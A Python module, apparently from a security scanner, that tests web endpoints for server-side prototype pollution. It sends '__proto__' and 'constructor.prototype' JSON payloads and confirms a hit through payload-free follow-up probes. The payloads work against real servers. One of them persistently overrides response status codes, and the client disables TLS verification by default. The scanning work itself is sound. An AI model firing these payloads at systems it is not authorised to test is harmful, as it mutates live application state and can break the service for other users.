"""Prototype-pollution tester (server-observable, deterministic).

Reflected payloads and "the app uses lodash.merge" are only *hints*. This module
CONFIRMS prototype pollution only through a deterministic, server-observable side
effect that proves `Object.prototype` was actually mutated — never through the raw
payload being echoed back.

Two techniques, each with an independent oracle:

  * reflected_property — pollute a UNIQUE property via `__proto__` /
    `constructor.prototype`, then issue a SEPARATE probe request that never
    carries the payload. If the unique marker value now appears in that probe
    response (and did NOT appear in a clean baseline), the property was inherited
    from a mutated prototype — confirmation. Because the probe request contains no
    payload, this cannot be simple reflection.

  * status_override — pollute `__proto__.status` (and `statusCode`) to an unusual
    value (e.g. 510). Many Node frameworks read a status off an options object that
    now inherits the polluted value. If a follow-up request returns that exact
    unusual status while the pre-pollution baseline did not, the prototype was
    mutated — confirmation.

Anything less (payload merely reflected, no baseline change) is NOT confirmed, so
a hardened server yields no false positive.

SAFETY: pollution values are inert markers / a benign HTTP status; short
per-request timeouts guarantee the tester cannot hang; every request is wrapped so
failures degrade to "not confirmed" instead of raising.
"""

from __future__ import annotations

import os
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

import httpx

# An unusual-but-valid HTTP status unlikely to be returned normally, used as the
# deterministic signal for the status_override gadget.
SENTINEL_STATUS = 510


@dataclass
class PollutionFinding:
    technique: str  # reflected_property | status_override
    confirmed: bool
    detail: str
    gadget: str  # the payload shape that worked (__proto__ / constructor.prototype)
    evidence: Dict[str, Any] = field(default_factory=dict)


class PrototypePollutionTester:
    """Test an endpoint for server-side prototype pollution with real requests.

    Parameters
    ----------
    pollute_url : endpoint that ingests/merges attacker JSON (POST by default).
    probe_url : endpoint whose response is observed AFTER pollution. Defaults to
        `pollute_url`. The probe request never carries the pollution payload.
    pollute_method : HTTP method used to submit the pollution payload.
    probe_method : HTTP method used for the (payload-free) probe/baseline request.
    client : an existing httpx.AsyncClient (for tests / connection reuse).
    timeout : hard per-request timeout in seconds.
    """

    def __init__(
        self,
        pollute_url: str,
        *,
        probe_url: Optional[str] = None,
        pollute_method: str = "POST",
        probe_method: str = "GET",
        client: Optional[httpx.AsyncClient] = None,
        timeout: float = 12.0,
    ):
        self.pollute_url = pollute_url
        self.probe_url = probe_url or pollute_url
        self.pollute_method = pollute_method.upper()
        self.probe_method = probe_method.upper()
        self._client = client
        self.timeout = timeout
        # Unique property name + value so a hit is unambiguous (not natural output).
        self.marker_key = f"osopPP{os.urandom(4).hex()}"
        self.marker_val = f"osop-pp-{os.urandom(6).hex()}"

    # ---- gadget payloads ----------------------------------------------------
    def _reflect_payloads(self) -> List[Dict[str, Any]]:
        return [
            {"gadget": "__proto__", "body": {"__proto__": {self.marker_key: self.marker_val}}},
            {
                "gadget": "constructor.prototype",
                "body": {"constructor": {"prototype": {self.marker_key: self.marker_val}}},
            },
        ]

    def _status_payloads(self) -> List[Dict[str, Any]]:
        return [
            {
                "gadget": "__proto__",
                "body": {"__proto__": {"status": SENTINEL_STATUS, "statusCode": SENTINEL_STATUS}},
            },
            {
                "gadget": "constructor.prototype",
                "body": {
                    "constructor": {
                        "prototype": {"status": SENTINEL_STATUS, "statusCode": SENTINEL_STATUS}
                    }
                },
            },
        ]

    # ---- request wrappers (never raise) -------------------------------------
    async def _send(
        self,
        client: httpx.AsyncClient,
        method: str,
        url: str,
        *,
        json_body: Optional[dict] = None,
    ) -> Optional[httpx.Response]:
        try:
            return await client.request(method, url, json=json_body, timeout=self.timeout)
        except Exception:
            return None

    @staticmethod
    def _body(resp: Optional[httpx.Response]) -> str:
        if resp is None:
            return ""
        try:
            return resp.text
        except Exception:
            return ""

    # ---- technique: reflected (inherited) property --------------------------
    async def _run_reflected(self, client: httpx.AsyncClient) -> Optional[PollutionFinding]:
        # Baseline: a clean probe must NOT contain our unique marker.
        baseline = await self._send(client, self.probe_method, self.probe_url)
        baseline_body = self._body(baseline)
        if self.marker_val in baseline_body:
            return None  # marker already present -> can't attribute to pollution

        for pl in self._reflect_payloads():
            pollute = await self._send(
                client, self.pollute_method, self.pollute_url, json_body=pl["body"]
            )
            # Probe with NO payload; if the marker now appears it was inherited.
            probe = await self._send(client, self.probe_method, self.probe_url)
            probe_body = self._body(probe)
            if probe is not None and self.marker_val in probe_body:
                return PollutionFinding(
                    technique="reflected_property",
                    confirmed=True,
                    detail=(
                        "Polluted property surfaced in a payload-free probe response, "
                        "proving Object.prototype was mutated (inherited, not reflected)."
                    ),
                    gadget=pl["gadget"],
                    evidence={
                        "marker_key": self.marker_key,
                        "marker_val": self.marker_val,
                        "baseline_contained_marker": False,
                        "probe_contained_marker": True,
                        "pollute_status": getattr(pollute, "status_code", None),
                        "probe_status": probe.status_code,
                        "probe_snippet": probe_body[:200],
                    },
                )
        return None

    # ---- technique: status/behavior override --------------------------------
    async def _run_status(self, client: httpx.AsyncClient) -> Optional[PollutionFinding]:
        baseline = await self._send(client, self.probe_method, self.probe_url)
        baseline_status = getattr(baseline, "status_code", None)
        if baseline_status == SENTINEL_STATUS:
            return None  # already returns sentinel -> not a usable oracle

        for pl in self._status_payloads():
            pollute = await self._send(
                client, self.pollute_method, self.pollute_url, json_body=pl["body"]
            )
            probe = await self._send(client, self.probe_method, self.probe_url)
            probe_status = getattr(probe, "status_code", None)
            if probe_status == SENTINEL_STATUS and baseline_status != SENTINEL_STATUS:
                return PollutionFinding(
                    technique="status_override",
                    confirmed=True,
                    detail=(
                        f"Follow-up request returned the injected status {SENTINEL_STATUS} "
                        f"(baseline {baseline_status}), proving prototype mutation."
                    ),
                    gadget=pl["gadget"],
                    evidence={
                        "baseline_status": baseline_status,
                        "polluted_followup_status": probe_status,
                        "injected_status": SENTINEL_STATUS,
                        "pollute_status": getattr(pollute, "status_code", None),
                    },
                )
        return None

    async def run(self) -> List[PollutionFinding]:
        findings: List[PollutionFinding] = []
        own = self._client is None
        # W5: audited insecure-TLS opt-in (logged, coercible via OSOP_TLS_VERIFY).
        from ai_osop.safety.governed_client import resolve_tls_verify

        client = self._client or httpx.AsyncClient(
            verify=resolve_tls_verify(False, allow_insecure=True, tool="prototype_pollution"),
            follow_redirects=True,
            timeout=self.timeout,
        )
        try:
            reflected = await self._run_reflected(client)
            findings.append(
                reflected
                or PollutionFinding(
                    technique="reflected_property",
                    confirmed=False,
                    detail="no inherited property observed in a payload-free probe; not confirmed",
                    gadget="__proto__",
                    evidence={"marker_key": self.marker_key, "marker_val": self.marker_val},
                )
            )

            status = await self._run_status(client)
            findings.append(
                status
                or PollutionFinding(
                    technique="status_override",
                    confirmed=False,
                    detail="follow-up status unchanged after pollution; not confirmed",
                    gadget="__proto__",
                    evidence={"injected_status": SENTINEL_STATUS},
                )
            )
        finally:
            if own:
                await client.aclose()
        return findings

    def confirmed(self, findings: List[PollutionFinding]) -> List[PollutionFinding]:
        return [f for f in findings if f.confirmed]
